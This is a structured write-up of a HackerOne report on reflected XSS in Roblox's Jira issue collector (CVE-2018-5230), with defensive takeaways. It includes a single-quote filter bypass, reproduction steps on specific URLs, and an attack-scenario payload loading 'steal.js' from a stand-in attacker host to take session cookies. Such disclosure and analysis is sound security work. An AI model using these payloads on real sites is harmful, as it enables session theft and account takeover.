# Reflected XSS through multiple inputs in Jira Issue Collector (CVE-2018-5230)

## Metadata
- **Source:** HackerOne
- **Report:** 380354 | https://hackerone.com/reports/380354
- **Submitted:** 2018-07-11
- **Reporter:** jackb898
- **Program:** Roblox
- **Bounty:** Not specified in report
- **Severity:** Medium
- **Vuln:** Reflected Cross-Site Scripting (XSS), Input Validation Bypass, Filter Evasion
- **CVEs:** CVE-2018-5230
- **Category:** web-api

## Summary
Multiple reflected XSS vulnerabilities exist in the Jira issue collector on jira.roblox.com running version 7.6.3, affecting the Updated Date filter section and other input fields. An input validation filter blocking double-quoted payloads can be bypassed by using single quotes instead, allowing arbitrary JavaScript execution. Since Roblox core domain cookies are shared with the Jira subdomain, exploitation could lead to account compromise.

## Attack scenario
1. Attacker identifies target Jira installation running vulnerable version 7.6.3
2. Attacker discovers CVE-2018-5230 references XSS in issue collector and begins testing various input fields
3. Attacker crafts payload with single quotes to bypass double-quote filtering: <iframe src='//attacker.com/steal.js'></iframe>
4. Attacker uses social engineering to trick victim into clicking malicious link with payload in filter parameters
5. Victim's browser executes payload, loading attacker's JavaScript which steals session cookies shared with roblox.com
6. Attacker uses stolen cookies to compromise victim's Roblox account

## Root cause
Insufficient input validation and sanitization in the issue collector's filter parameters. The application attempts to filter dangerous characters by escaping double quotes but fails to account for single-quote variations, allowing a simple bypass of the security control.

## Attacker mindset
Methodical vulnerability researcher who recognized outdated software version, cross-referenced known CVEs, and systematically tested each input field to identify bypass techniques. Focused on chaining XSS with cookie theft due to domain cookie sharing policy.

## Defensive takeaways
- Keep all server software updated to latest patched versions immediately upon release
- Implement context-aware output encoding (HTML, JavaScript, URL context) rather than simple character blacklisting
- Use whitelist-based input validation for filter parameters instead of blacklist approaches
- Apply comprehensive Content Security Policy (CSP) headers to mitigate XSS impact
- Review all filter and search input fields for similar validation bypasses
- Implement HTTPOnly and Secure flags on session cookies to reduce theft impact
- Consider separating domain cookies between administrative tools and user-facing applications

## Variant hunting
Test other Jira filter parameters beyond 'Updated Date' for similar XSS; examine date range inputs, assignee fields, and priority filters. Check if other quote variations (backticks, angled brackets) bypass filters. Test stored XSS variants if filter values persist across sessions.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing for Information
- T1566 - Phishing
- T1539 - Steal Web Session Cookie

## Notes
Researcher appropriately referenced the CVE number but notes the CVE itself lacks technical detail. The filter bypass technique (single vs double quotes) is simple but effective, indicating shallow security implementation. Report demonstrates good vulnerability chaining by connecting XSS to cookie theft via subdomain cookie sharing. Roblox later patched by updating Jira to 7.6.7 or later.

## Full report
<details><summary>Expand</summary>

**Note I put this as Medium because that's what the CVE is. This vulnerability is known and it's classified under CVE-2018-5230. Here's a link to the thread on it by Atlassian: https://jira.atlassian.com/browse/JRASERVER-67289
Description
---------------------
I noticed when testing that your Jira installation at jira.roblox.com is running on version 7.6.3, which isn't the latest version. When you have something like Jira or Wordpress, having the latest installation is critical because lots of vulnerabilities for previous versions will be disclosed right after the company releases the latest version. That was the case here.

So I decided that since it was on 7.6.3, I'd check CVEs and see if there were any that effected Jira installations 7.6.3 and newer. After a LOT of scouring (there's tons of CVEs for Jira on older or different platforms) I found CVE-2018-5230, which isn't very helpful but it led me in the direction of the issue collector.

CVE-2018-5230 outlines "XSS in the issue collector" but doesn't specify anything, so that was left up to me.

Locations
---------------------
After some testing in all of the issue collector, I've compiled this list of the reflected XSS locations in it. To make it easier, I've set this up with each having it's own number and explanation on how to use it.

There's only one filter that I've found for these; when using certain HTML tags like "src=" and in JS alerts using alert("texthere"), it appends two backslashes, ex. if you put in this payload: 
```
<iframe src="//google.com"></iframe>
```
The output in the page will be:
```
<iframe src="\&quot;//google.com\&quot;"></iframe>
```
HOWEVER I found a bypass to this filter; instead of using double quotes, simply use all single quotes in payloads. For example if you use the payload 
```
<iframe src='//google.com'></iframe>
```
The output will be:
```
<iframe src="//google.com"></iframe>
```

1ST AREA
https://jira.roblox.com/issues/?filter=-8 in the "Updated Date" section. 
HOW TO EXPLOIT:
1. Go to the link above
2. Click the "Updated Date:" text area
3. Put your XSS payload in "More than [ ] minutes ago" (15 character payload limit) or in "In range [   ] to [   ]" (No length limit, ONLY put the payload in the first box)
4. Click Update
5. Payload will run. If it doesn't run chances are you used double quotes somewhere. Only use single quotes!

Each area past this first one uses the exact same method of exploitation and has the same inputs/outputs so I'll just put the links to them
https://jira.roblox.com/issues/?filter=-7
https://jira.roblox.com/issues/?filter=-6



Resolution
---------------------
Update your JIRA version to 7.6.7 or later, might as well update to the latest version. This should sufficiently patch all of these vulnerabilities.

Additional Information
---------------------
I know this isn't a core Roblox domain but I strongly believe it has the same impact regardless; as you can see from the attachment: 
{F319184} 
The core Roblox cookies are shared onto this domain, so that's a main factor in why this has equal impact as to if it were on roblox.com.

## Impact

An attacker could use carefully crafted payloads with simple social engineering to steal Roblox user's accounts. As I've mentioned, the cookies from Roblox's core site are shared with this one as well, and while it may not be a core Roblox site, it's still a *.roblox.com so any suspicions of phishing by the victim could be excused with that reasoning.

Additionally, with XSS you can use specially designed iframes linked to your own JS content, allowing jacking of cookies and other information from the victim.

</details>

---
*Analysed by Claude on 2026-05-12*
